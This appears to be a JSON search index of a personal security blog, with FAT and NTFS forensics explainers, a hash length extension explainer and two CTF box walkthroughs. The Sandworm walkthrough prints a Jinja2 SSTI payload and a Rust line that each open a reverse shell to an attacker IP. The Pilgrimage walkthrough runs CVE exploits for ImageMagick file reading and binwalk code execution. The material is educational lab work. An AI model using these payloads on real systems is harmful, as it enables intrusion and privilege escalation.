[
  
  {
    "title": "FAT",
    "url": "/posts/FAT-filesystem-explained/",
    "categories": "File System",
    "tags": "FAT, Forensics",
    "date": "2024-03-04 00:00:00 +0000",
    





    
    "snippet": "FAT (file allocation table)The file allocation table (FAT) file system was originally developed in 1977 for use on floppy disks and the windows 9x operating systems. However,it is still in use toda...",
    "content": "FAT (file allocation table)The file allocation table (FAT) file system was originally developed in 1977 for use on floppy disks and the windows 9x operating systems. However,it is still in use today in removable storage devices like usbs this is because fat has a relatively small overhead and is supported by all the operating systems, so it is a good medium to move around data. Also, Fat is simple because it only really relies on two data structures the file allocation table and the directory entries which reduces the size and complexityneeded to support it in the operating system kernel.GeneralThe basic idea of a FAT file system is that each file and directory is allocated a data structure called a directory entry(32 byte in length) that contains the starting address, file name, size, file content and other pieces of metadata. The datain the FAT file system is stored in a data unit called a cluster (like ntfs) if the data in a file or directory needs more than one clusterto contain all the data the other clusters needed to store the data are found in the file allocation table. This file allocation data structure is used to identify the next cluster in a file or directory and is also used to identity the allocation status of the cluster (if it is already beingused or not).In the example above the name.png points to the 4th cluster which means we look at the 4th entry in the fat to see if there are any more clusters needed for the file. The 4th entry in the points to the fat entry 10 which means that the file always uses cluster10 to store data and that points to 1st entry and then the first entry points to the 3rd entry which is negative one which isa end of file (eof) marker. So we know that name.png uses clusters 4,10,1,3 to store its data.Directory entry data structureThe directory entry is a data structure that is allocated for every file and directory. It is 32 bytes in size and contains the file’s attributes, size, starting cluster, and dates and times.The image above is the structure of a directory entry in FAT. The first byte in the directory entry can show if the file or directory has been deletedwhich can help searching for files that have been deleted but not yet overwritten. Also, can see what data the file used by lookingat bytes 26-27 to see the address of the first cluster and then follow the file allocation table to see what other clusters where being used by the file however if the cluster has been reallocated this can show a false presentation of the deleted file and make recovery of the original data nearly impossible.File allocation table data structureThere are normally two file allocation tables in a file system with one being for backup if the original file allocation tablegets corrupted but the exact number is given in the boot sector the file allocation table. The total size of each File allocation tableis given in the boot sector.The table consists of equal-sized entries and has no header or footer values which can make it moredifficult to search in file systems because it has no magic values. The size of each entry depends on the file system versionwith FAT12 having 12 bit entries, FAT16 having 16 bit entries and FAT32 having 32 bit entries. The entries of the File allocationtable start from zero with each entry’s address corresponding to the cluster with the same address. Entry’s with 0 in them meanthey are not allocated to a file if an Entry is allocated it will be a non-zero and will the address of the next cluster in the file ordirectory. The last cluster in the file corresponding file allocation table will contain an end of file value which is a largevalue like 0xffff.FAT Maximum sizesThe maximum cluster size in a FAT file system is 64KB. And because in FAT12 only 12 bit are used forthe entry in the File allocation table which means the maximum address is 212 = 4096 and 12 clusters are reversedfor things like boot code and the file allocation itself the maximum size of FAT12 file system is 4084 * 64kb which is around256MB which is nothing in today’s world which shows why the FAT file system was replaced by the NTFS file system which can support larger file systems and has more advanced features like more attributes and more logging. The maximum size of an FAT16 filesystem is FAT16: 4GB (for 64kB clusters) because it has 4 more bits for addresses. Even if the size was good the fact that clusters have to be 64kb means that the space won’tbe used up efficiently and there will be alot of wasted space in the file system.The FAT32 has a maximum of 2TB (512B sectors) which is alot better but still is not big enough and FAT doesn’t support advanced features like journaling which means that it is not used as a primary computer file system in today’s world."
  },
  
  {
    "title": "MFT",
    "url": "/posts/NTFS-filesystem-explained/",
    "categories": "File System",
    "tags": "NTFS, MFT, Forensics",
    "date": "2024-02-28 00:00:00 +0000",
    





    
    "snippet": "MFTGeneralA feature of NTFS that sets it apart from other file systems is that the entire file system is considered data area whichmeans that any sector can be allocated to a file.The only layout a...",
    "content": "MFTGeneralA feature of NTFS that sets it apart from other file systems is that the entire file system is considered data area whichmeans that any sector can be allocated to a file.The only layout an NTFS file system has is that the first sectors of the volumecontain the boot sector and the boot code.MFT GeneralThe master file table is the main feature of the NTFS file system because it contains information on all the files and directory’s. Each file and directory has at least one entry in the MFT which is 1KB in size but can have more if the file or directory needs more attributes.The first 42 bytes of the MFT entry has a specific purpose, and the rest of the data is filledup with attributes (these are small data structures that have a specific purpose like storing the file name).The first entry in the MFT is always $MFT which describes the MFT file location on disk. This is the only place where the sizeand location of the MFT is found so this needs to parse so the rest of the files and directory’s can be located on the file system. The starting location of the MFT is described in the boot sector (which is the first sector of the filesystem) so the operating system can locate and parse the MFT when loaded.The size of the MFT entry is stored in the boot sector but has always been 1KB in all versions of windows (this is why if you create a file which very little data the size will still be a 1KB in size).What are MFT entriesMFT entry’s uses attributes to store every think about the file and directory and while each type of attribute stores a different type of data, all attributes have two parts: the header and the content. Attribute sizes can vary because attributescan store things like the filename or the file content which may be MB or GB in size. Because it would be impossible to store large attributes into the MFT entry (which as to date has only been 1KB) there is two types of attributes an residentattribute where the attribute is stored in the mft entry and a non-resident attribute where the data is stored in an external cluster run. The header of the attribute states weather the attribute is resident or not. If the attribute is residentthen the data will for the attribute will come after the header if it is non-resident then the header will give the cluster address.Forensic UseThis means if doing a forensic analysis of an NTFS file system if the data attribute for the file is resident then the file is deletedthe data may be recoverable. Since when a file is deleted the mft entry isn’t actually deleted it is just shown to be not inuse that other files can use it by overwriting the entry. So if the entry isn’t overwritten by other file being created (the time taken for this to happen depends on how munch activity is done on the filesystem) then will still be able to findthe file content in the entry for the file which was deleted.ADS ($Data Attribute)An Alternative data streams is when a file has one than one $Data attribute which is the attribute that stores the files content.The default $DATA attribute that is created when a file is created does not have a name associated with it, but additional $DATA attributes must have one.This can make it easy to spot because the added data streams will need to have an name associated with themEncryption AttributeAny Attribute could be encrypted but the $Data attribute (the content attribute) is the only attribute that gets encrypted.When the attribute gets encrypted the header of the attribute remains unencrypted but the content of the attribute is encrypted.A additional attribute is also created called the $Logged_utility_stream which contains the keys in order to decrypt the file.A random key is created for each MFT entry with an encrypted attribute and this is called the file encryption key (FEK). If there are more than one data streams (Alternative Data Stream file) they all get encrypted with the same FEK.This FEK is stored in the $LOGGED_UTILITY_STREAM attribute. This attribute contains two lists of Data Decryption fields (DDF) and data Recovery fields (DRF).A Data decryption field id created for each user who has access to the file and this field contains the following the users SID (Security ID), encryption information and the FEK that was used to encrypt the key encrypted with the users public key so thatonly the users private key can decrypt the FEK and then decrypt the file. A data recovery field (DRF) is created for every method of datarecovery, and it contains the FEK encrypted with the data recovery public key which can then used when allow access to the FEK whenthe data recovery private key is used to decrypt it and then can decrypt the file and recover it.When a user is revoked from the ACL and can no longer access their key is removed from the data decryption field list, so theycan no longer decrypt the file. The Users private key is stored in the registry and is encrypted using a symmetric encryption (same key to encrypt and decrypt) and the key to encrypt the private key with is derived from the users’ password."
  },
  
  {
    "title": "Hash Extension Attack",
    "url": "/posts/Hash-Extension-Attack/",
    "categories": "Crypto",
    "tags": "sha1, Merkle Damgard construction, Hash Extension",
    "date": "2023-12-09 00:00:00 +0000",
    





    
    "snippet": "Hash extensionThis attack allows an attacker to append arbitrary data to the text being hashed (with sha1, sha2 and md5) as long as the users data is at the end and know a valid hash. This can allo...",
    "content": "Hash extensionThis attack allows an attacker to append arbitrary data to the text being hashed (with sha1, sha2 and md5) as long as the users data is at the end and know a valid hash. This can allow to an attacker to create a valid hash with malicious data even if a secret is prepended tothe data being hashed.Background on hashesThis an attack works on hashes Merkle Damgard construction this splits the message into identical blocks and then mix’sthese blocks with an internal state using a compression function. The initialization vector (iv) is H0 and Miis a message bock and then the output on the compression function is then passed as input to the next compression and repeats this until all the bytes in the message have been compressed. Then when no more data needs to be compressed the output of the hashfunction is just the internal state at the end.How it worksAs the hash that is outputted is just the internal state of the hash function when it does not need to compress anymore data we know the internal state of the hash function that will be used if a new block is added. So the output of the original data without the appended data is the 2nd  to last internal state passed into the function with the appended dataand hence we can create the hash with the appended data because we know the internal state that will be used with the appended data as long as padding the data is correct so that the new appended data is in a new block.In the image above H = Hash(M1 || M2) is the original hash without the appended data, so we know that will be the internal state passed to the last compresses function if the padding is correct. The padding needs to be correctbecause the hash functions works in blocks so if the appended data is not in a new block it will change the original internal state because the data that is being compresses has changed because it is not in a new block. The padding that is used on most algorithms is the text in the last block that isn’t a multiple of 64 is padded until it is 8 less than a full 64 byte block.The data in the uncompleted block is followed by a 1 then null bytes until it is 8 bytes less than a full 64 byte block which is where length of the message goes in hex. However, we might not know the length of the message there might be a secret prepended to the hash data that we don’t know the length to, so we will have to brute force the paddinguntil we get valid padding for the length of the secret data that is being prepended to the message. We could also create a program that sets the internal state of the hash function to the hash without the appended data and update the hash function to have a new block with the append data and thus get a valid hash.More informationThe images come from the Serious Cryptography: A Practical Introduction to Modern Encryption and there is a good blog post of this by the creator of the hash_extender tool that can be used to exploit this Blog post.The ippsec video extension shows an example of exploiting this attack to get rce on the box Extension."
  },
  
  {
    "title": "Pilgrimage",
    "url": "/posts/Pilgrimage/",
    "categories": "CTF",
    "tags": "ctf, git, CVE-2022-44268, CVE-2022-4510",
    "date": "2023-11-25 00:00:00 +0000",
    





    
    "snippet": "PilgrimageThis was an easy  box that featured an unprotected git repository that we could use to see that it is using vulnerablesoftware that we can use to read a sensitive file containing a passwo...",
    "content": "PilgrimageThis was an easy  box that featured an unprotected git repository that we could use to see that it is using vulnerablesoftware that we can use to read a sensitive file containing a password and then ssh into the box. Then we see that root is running a custom script that was executing a vulnerable version of binwalk that we could use to get a shell as root.ReconnmapWe see the ports 22 and 80 are open, so the only attack vector is the website, so we can go to the website.port 80We see that there is a host name we need to add to /etc/hosts before we can reach the website. We also can then fuzz for subdomains but that doesn’t give us anything, so we can leave this and fuzz for subdomains.We see on the ffuf results there is a .git directory that we can access, so we can use a tool like git_dumper to get allthe files that are stored in the git repository and then analyze the source code.We see that in the git files there is the application called magick which is an application that does image processing and if we look at the version we see that the version is 7.10-0-49 and that is vulnerable tolfi which we can use to read sensitive files.LFIIf we go to the website we see that we register an account, and then we can upload an image that gets resized likely using the magick application, so we can use the lfi to read files. If we look at the source code and in login.php the database that is being used is stored in /var/db/pilgrimage so if we can read that we might be able to get a password to log in with ssh, so we upload the malicious image which gets resized and triggers the exploit when it is resized. Then we can wget http://pilgrimage.htb/shrunk/image_idto get the image, and then we can read the data that using identify -verbose image_name.pngand then converting the hex to the ascii equivalent to see if there is anything interesting.In the database file we see that there is a username of emily and the password that we can try to use to ssh into the boxwhich is successful.Shell as RootIf we look at sudo -l we see that we cant run anything as sudo we can and there is no special suid programs that we canexploit. We can upload pspy64 on the box and see what processes are running on the box and see that there is a custommalware.sh script that is being as root.The script is running binwalk on files uploaded to /var/www/pilgrimage.htb/shrunk, so we can look at the version on binwalkto see what version of binwalk is being used on the box.#!/bin/bashblacklist=(\"Executable script\" \"Microsoft executable\")/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do        filename=\"/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo \"$FILE\" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')\"        binout=\"$(/usr/local/bin/binwalk -e \"$filename\")\"        for banned in \"${blacklist[@]}\"; do                if [[ \"$binout\" == *\"$banned\"* ]]; then                        /usr/bin/rm \"$filename\"                        break                fi        donedonewe see running /usr/local/bin/binwalk the version of binwalk is v2.3.2 and there is a rce on this version. Which we can use to get privileges as root. If we run the python3 exp.py /var/www/pilgrimage.htb/shrunk/6561bb2e1406b.png 10.10.14.3 1234 with exp.py being the exploit from the link earlier. Then we can copy the created image to the /var/www/pilgrimage.htb/shrunk directoryso that it triggers the inotify event create and executes the script and gives us a root privileges because the image ispassed into binwalk and gives us rce."
  },
  
  {
    "title": "Sandworm",
    "url": "/posts/Sandworm/",
    "categories": "CTF",
    "tags": "ctf, ssti, rust, python, CVE-2022-31214",
    "date": "2023-11-18 00:00:00 +0000",
    





    
    "snippet": "SandwormThis was a medium box that featured a ssti and had a rust library that we could change to run malicious code, and then itwas a setuid program that has a know cve against it. This is my firs...",
    "content": "SandwormThis was a medium box that featured a ssti and had a rust library that we could change to run malicious code, and then itwas a setuid program that has a know cve against it. This is my first blog post so there might be some mistakes.Initial footholdOn the nmap scan we see that 3 ports are open and that we are given a host name that we can add to /etc/hostsUpon visiting the website we see that it’s something to do a secret spy agency and that it is using the flask frameworkbecause of the powered by flask at the bottom of the page. Clicking on the contact page we see that we can send pgp messagesalso we can try a guide on pgp. On the guide we can verify a signature of a message, so we can generate a key and signthe message with that key and see what the page displays to us. We can use gpg for this which is the GNU privacy guard and is an open source pgp implementation.We first use the –gen-key flag to generate the key with the email of a@a.com and a Real nameof whatever.We can then export the key and the -a flag means that the key with be exported in ascii format so that we can copy into the key box when versing the signature. We then create the message that we want to sign this only worked forme if the file was a txt file. Then we can use the clear-sign so that signature is readable, and again we can copy it into the signed message box.We see that the name we entered is rendered into the result and because the website is powered by flask the tempalting engine that would be in use would be Jinja2 we can test this by creating another key with the name of the key being a ssti. First I will delete the key we made using the -k flag to list the key and then using the –delete-secret-keys with the key id to delete the secret key and then using the –delete-key to fully delete the key. And then we can use the –gen-key again but change the real name to be a jinja2 payload can get this from payload of all the things. And then sign the message again withthis new key and go to verify it.{\\{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo \"base64 bash reverse shell\" | base64 -d | bash').read() }} #get rid of the \\ it wasnt rendering on the website if was in the double curly brackets.Shell as silentobserverWhen we go to verify this key the page hangs, and we get a reverse shell. On the shell we seem to be a restricted shell asthere is none of the usually tools and our terminal name is dumb.In our users home directory there is a directory called .config and upon going there we see firejail which is a sandboxing programbut there is nothing in that directory we also see httpie which is a command line http client. Since it is a http command lineclient it may store passwords used on websites and things like that we can check for password reuse. In the directory there isan admin.json file with a password and username in it and if we look at /etc/passwd that user is on the box. So we can try to sshin as that user and get a better shell then the current one, and we can ssh as that user.Shell as Atlas (unrestricted)Since we know the password we can try sudo -l, but we can’t run as sudo also this user has .cargo directory in its home which points to rust being used.This is because cargo is build and package manager for rust and there should be a caro.tomlsomewhere that cargo is using to build the rust applications.We can also check for cronjobs by putting pspy on the box and see what is being run and who as.We see that the flask application is being run in firefail so that explains why are shell was restrictedwhen we get the reverse shell. We also see a cron job for cargo and is running as atlas, and we see the directory,so we can go check that directory and see what the cargo.toml that the cargo uses looks like to build the application.We see the cargo.toml is using a logger library that is custom and is using the extern crate logger; in the main.rs codeto include the dependency which is in an external crate to the one it was declared in.We see that in the main source code this use std::process::Command; is being used to execute commands so if we add that to the library we should be able to execute commands when the log library is called in the main.rs code. So we do the command::new(\"bash\").arg(\"-c\").arg(\"bash -i &gt;&amp; /dev/tcp/10.10.14.26/1234 0&gt;&amp;1\").output();`And then when the cron jobs execute and builds the new library and uses it we get a reverse shell as atlas in a normal shell.Shell as rootIf we look at suid bits now we see the firejail suid bit and beacuse we are part of the jailer group we can now executethe firejail suid bit program. But before we exploit that i am going to add a ssh key to .ssh directory in the home directoryfor atlas so we can better shell.We see that the firejail version is 0.9.68 and there is this exploit for this version https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2022-31214-Firejail-LPE . We Can run this and get root on the box. And that is the box and we can now read root.txt.Beyond RootThe rust script was being used to something in the database as there is a database url in that and a password but that passworddoesn’t lead to anything. I don’t really know rust, so I don’t really know what’s going on, but it seems to be taking submissions from the website and then putting them into the database. If we connect to the database we see that there are some encrypted messagesstored in there from submissions and some other messages that don’t lead to anything.The main source code is executing code and then passing the username from that command to the log library which then takesit logs to access.log file which runs the username and what the action it was taken.We see that in the app.py and the function that is responsible for displaying the message that it is rendering a template with themsg variable. If the key is verified then the output of verifying the key is put into the message and we can control the namein that message and then the study.html template uses that variable passed to it so we can control what does a part of what goes into  and there is no filter, so we can get command execution,"
  }
  
]

